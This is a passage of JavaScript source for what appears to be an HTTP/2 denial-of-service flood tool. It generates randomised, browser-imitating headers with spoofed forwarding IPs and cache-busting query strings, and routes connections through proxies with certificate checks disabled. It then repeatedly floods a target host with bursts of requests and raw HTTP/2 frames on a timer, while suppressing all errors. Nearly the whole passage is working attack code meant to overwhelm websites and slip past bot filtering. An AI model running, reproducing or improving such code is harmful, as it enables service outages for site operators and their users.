        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/",
        "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/",
        "https://www.reddit.com/", "https://www.facebook.com/", "https://www.linkedin.com/",
        "https://www.amazon.com/", "https://www.netflix.com/", "https://www.nvidia.com/",
        "https://www.paypal.com/", "https://news.ycombinator.com/", "https://www.bbc.com/"
    ][Math.floor(Math.random() * 18)],

    "origin": [
        "https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", 
        "https://www.twitch.tv", "https://www.google.com", "https://www.reddit.com",
        "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
        "https://news.ycombinator.com"
    ][Math.floor(Math.random() * 10)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)],

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",
        
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 500) + 50,
    "downlink": (Math.random() * 10).toFixed(2)
},
    safari: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"Safari";v="${Math.floor(17 + Math.random() * 2)}", "Not A;Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
    "sec-ch-ua-platform": `"macOS"`,
    "sec-ch-ua-platform-version": `"14.${Math.floor(Math.random() * 6)}"`,
    "sec-ch-ua-full-version-list": `"Safari";v="${Math.floor(17 + Math.random() * 2)}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `""`,
    "sec-ch-ua-arch": `"arm64"`,

    "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(14 + Math.random() * 2)}_${Math.floor(Math.random() * 6)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(17 + Math.random() * 2)}.0 Safari/605.1.15`,

    "accept": Math.random() < 0.5 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.9", 
        "es-ES,es;q=0.7", "ja-JP,ja;q=0.8", "zh-CN,zh;q=0.7"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, br, deflate", 
        "gzip, br", "br, gzip"
    ][Math.floor(Math.random() * 4)],

    "referer": [
        "https://www.apple.com/", "https://www.google.com/", "https://www.wikipedia.org/",
        "https://www.reddit.com/", "https://www.twitter.com/", "https://www.youtube.com/",
        "https://www.instagram.com/", "https://www.twitch.tv/", "https://news.ycombinator.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": [
        "https://www.apple.com", "https://www.wikipedia.org", "https://www.twitter.com", 
        "https://www.reddit.com", "https://www.instagram.com", "https://news.ycombinator.com"
    ][Math.floor(Math.random() * 6)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",
        
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 500) + 50,
    "downlink": (Math.random() * 10).toFixed(2)
},
    mobile: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"Google Chrome";v="${Math.floor(122 + Math.random() * 3)}", "Not(A:Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": `"Android"`,
    "sec-ch-ua-platform-version": `"${Math.floor(11 + Math.random() * 3)}.0"`,
    "sec-ch-ua-full-version-list": `"Google Chrome";v="${Math.floor(122 + Math.random() * 3)}.0.0.0", "Not(A:Brand";v="99.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `"${["Pixel", "Samsung", "OnePlus", "Xiaomi", "Oppo", "Vivo"][Math.floor(Math.random() * 6)]} ${Math.floor(5 + Math.random() * 6)}"`,

    "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(11 + Math.random() * 3)}; ${["Pixel", "Samsung", "OnePlus", "Xiaomi", "Oppo", "Vivo"][Math.floor(Math.random() * 6)]} ${Math.floor(5 + Math.random() * 6)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(122 + Math.random() * 3)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`,

    "accept": Math.random() < 0.5 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
        "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, br, deflate", 
        "gzip, br", "br, gzip"
    ][Math.floor(Math.random() * 4)],

    "referer": [
        "https://m.google.com/", "https://m.youtube.com/", "https://m.reddit.com/",
        "https://m.twitter.com/", "https://m.instagram.com/", "https://m.facebook.com/",
        "https://m.tiktok.com/", "https://m.whatsapp.com/", "https://m.wikipedia.org/"
    ][Math.floor(Math.random() * 9)],

    "origin": [
        "https://m.google.com", "https://m.youtube.com", "https://m.twitter.com", 
        "https://m.reddit.com", "https://m.instagram.com", "https://m.facebook.com"
    ][Math.floor(Math.random() * 6)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",
        
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 500) + 50,
    "downlink": (Math.random() * 10).toFixed(2)
},
    firefox: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"Not A;Brand";v="99", "Mozilla Firefox";v="${Math.floor(124 + Math.random() * 2)}"`,
    "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
    "sec-ch-ua-platform": `"Windows"`,
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0.0"` : `"11.0.0"`,
    "sec-ch-ua-full-version-list": `"Mozilla Firefox";v="${Math.floor(124 + Math.random() * 2)}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `""`,
    "sec-ch-ua-arch": `"x86"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.6 ? "10.0" : "11.0"}; Win64; x64; rv:${Math.floor(124 + Math.random() * 2)}.0) Gecko/20100101 Firefox/${Math.floor(124 + Math.random() * 2)}.0`,

    "accept": Math.random() < 0.5 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
        "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, br, deflate", 
        "gzip, br", "br, gzip"
    ][Math.floor(Math.random() * 4)],

    "referer": [
        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/",
        "https://www.twitch.tv/", "https://discord.com/", "https://www.mozilla.org/",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/",
        "https://www.reddit.com/", "https://www.facebook.com/", "https://www.linkedin.com/",
        "https://www.amazon.com/", "https://www.netflix.com/", "https://www.nvidia.com/",
        "https://www.paypal.com/", "https://news.ycombinator.com/", "https://www.bbc.com/"
    ][Math.floor(Math.random() * 18)],

    "origin": [
        "https://www.mozilla.org", "https://discord.com", "https://store.steampowered.com", 
        "https://www.twitch.tv", "https://www.google.com", "https://www.reddit.com",
        "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
        "https://news.ycombinator.com"
    ][Math.floor(Math.random() * 10)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",

    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 400) + 50,
    "downlink": (Math.random() * 8 + 1).toFixed(2)
},
    opera: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"Opera";v="${Math.floor(120 + Math.random() * 3)}", "Chromium";v="${Math.floor(122 + Math.random() * 3)}", "Not A;Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
    "sec-ch-ua-platform": `"Windows"`,
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0.0"` : `"11.0.0"`,
    "sec-ch-ua-full-version-list": `"Opera";v="${Math.floor(120 + Math.random() * 3)}.0.0.0", "Chromium";v="${Math.floor(122 + Math.random() * 3)}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `""`,
    "sec-ch-ua-arch": `"x86"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.6 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(122 + Math.random() * 3)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(120 + Math.random() * 3)}.0.0.0`,

    "accept": Math.random() < 0.5 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
        "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, deflate, lz4, br, zstd", 
        "gzip, br, deflate, zstd", "br, gzip"
    ][Math.floor(Math.random() * 4)],

    "referer": [
        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/",
        "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/",
        "https://www.reddit.com/", "https://www.facebook.com/", "https://www.linkedin.com/",
        "https://www.amazon.com/", "https://www.netflix.com/", "https://www.nvidia.com/",
        "https://www.paypal.com/", "https://news.ycombinator.com/", "https://www.bbc.com/"
    ][Math.floor(Math.random() * 18)],

    "origin": [
        "https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", 
        "https://www.twitch.tv", "https://www.google.com", "https://www.reddit.com",
        "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
        "https://news.ycombinator.com"
    ][Math.floor(Math.random() * 10)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",
        
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 400) + 50,
    "downlink": (Math.random() * 8 + 1.5).toFixed(2)
},
    operagx: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"Opera GX";v="${Math.floor(123 + Math.random() * 2)}", "Chromium";v="${Math.floor(123 + Math.random() * 2)}", "Not.A/Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
    "sec-ch-ua-platform": `"Windows"`,
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0.0"` : `"11.0.0"`,
    "sec-ch-ua-full-version-list": `"Opera GX";v="${Math.floor(123 + Math.random() * 2)}.0.0.0", "Chromium";v="${Math.floor(123 + Math.random() * 2)}.0.0.0", "Not.A/Brand";v="99.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `""`,
    "sec-ch-ua-arch": `"x86"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.6 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(123 + Math.random() * 2)}.0.${Math.floor(2000 + Math.random() * 3000)}.0 Safari/537.36 OPR/${Math.floor(123 + Math.random() * 2)}.0.0.0`,

    "accept": Math.random() < 0.5 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.6"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
        "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, deflate, lz4, br, zstd", 
        "gzip, br, deflate, zstd", "br, gzip, zstd"
    ][Math.floor(Math.random() * 4)],

    "referer": [
        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/",
        "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/",
        "https://www.reddit.com/", "https://www.facebook.com/", "https://www.linkedin.com/",
        "https://www.amazon.com/", "https://www.netflix.com/", "https://www.nvidia.com/",
        "https://www.paypal.com/", "https://news.ycombinator.com/", "https://www.bbc.com/"
    ][Math.floor(Math.random() * 18)],

    "origin": [
        "https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", 
        "https://www.twitch.tv", "https://www.google.com", "https://www.reddit.com",
        "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
        "https://news.ycombinator.com"
    ][Math.floor(Math.random() * 10)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",
        
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 350) + 80,
    "downlink": (Math.random() * 9 + 1).toFixed(2)
},
    duckduckgo: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(123 + Math.random() * 3)}", "Chromium";v="${Math.floor(123 + Math.random() * 3)}", "Not.A/Brand";v="8"`,
    "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
    "sec-ch-ua-platform": `"Windows"`,
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0.0"` : `"11.0.0"`,
    "sec-ch-ua-full-version-list": `"DuckDuckGo";v="${Math.floor(123 + Math.random() * 3)}.0.0.0", "Chromium";v="${Math.floor(123 + Math.random() * 3)}.0.0.0", "Not.A/Brand";v="8.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `""`,
    "sec-ch-ua-arch": `"x86"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.6 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(123 + Math.random() * 3)}.0.${Math.floor(3000 + Math.random() * 1000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(123 + Math.random() * 3)}.0.0.0`,

    "accept": Math.random() < 0.5 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
        "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, deflate, lz4, br, zstd", 
        "gzip, br, deflate, zstd", "br, gzip"
    ][Math.floor(Math.random() * 4)],

    "referer": [
        "https://www.duckduckgo.com/", "https://www.google.com/", "https://store.steampowered.com/",
        "https://www.epicgames.com/", "https://www.twitch.tv/", "https://discord.com/",
        "https://www.opera.com/gx", "https://www.youtube.com/", "https://twitter.com/",
        "https://www.instagram.com/", "https://www.reddit.com/", "https://www.facebook.com/",
        "https://www.linkedin.com/", "https://www.amazon.com/", "https://www.netflix.com/",
        "https://www.nvidia.com/", "https://www.paypal.com/", "https://news.ycombinator.com/"
    ][Math.floor(Math.random() * 18)],

    "origin": [
        "https://www.duckduckgo.com", "https://www.google.com", "https://discord.com", 
        "https://store.steampowered.com", "https://www.twitch.tv", "https://www.reddit.com",
        "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
        "https://news.ycombinator.com"
    ][Math.floor(Math.random() * 10)],

    "x-forwarded-for": generateLegitIP(),
    "x-real-ip": generateLegitIP(),
    "x-client-ip": generateLegitIP(),
    "forwarded": `for=${generateLegitIP()};proto=https`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 
        ? "max-age=0" 
        : "no-cache, no-store, must-revalidate",
        
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "te": "trailers",
    "early-data": "1",
    "priority": `"u=0, i"`,
    "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
    "rtt": Math.floor(Math.random() * 500) + 50,
    "downlink": (Math.random() * 10).toFixed(2)
}
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
                        }

                        let allHeaders = Object.assign({}, headers, headers4);


const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            //console.error('Cipher info is not available. TLS handshake may not have completed.');
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
    
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    let hpack = new HPACK();
    let client;
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : h2settings,
        socket: tlsSocket,
    });
    
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([...h2_config])),
        encodeFrame(0, 8, updateWindow)
    ];
    
    client.on('connect', async () => {
        const intervalId = setInterval(async () => {
            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
    
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
    
            const dynHeaders = shuffleObject({
                ...allHeaders,
                ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{}),
                ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)})
            });
    
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);
    
            const streamId = 1;
            const requests = [];
            let count = 0;
    
            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < args.Rate; i++) {
                    const requestPromise = new Promise((resolve, reject) => {
                        const req = client.request(dynHeaders)
                        .on('response', response => {
                            req.close();
                            req.destroy();
                            resolve();
                        });
                        req.on('end', () => {
                            count++;
                            if (count === args.time * args.Rate) {
                                clearInterval(intervalId);
                                client.close(http2.constants.NGHTTP2_CANCEL);
                            }
                            reject(new Error('Request timed out'));
                        });
    
                        req.end();
                    });
    
                    const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                    requests.push({ requestPromise, frame });
                }
    
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                client.write(Buffer.concat(frames));
            }
        }, 500);  
    });
    
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});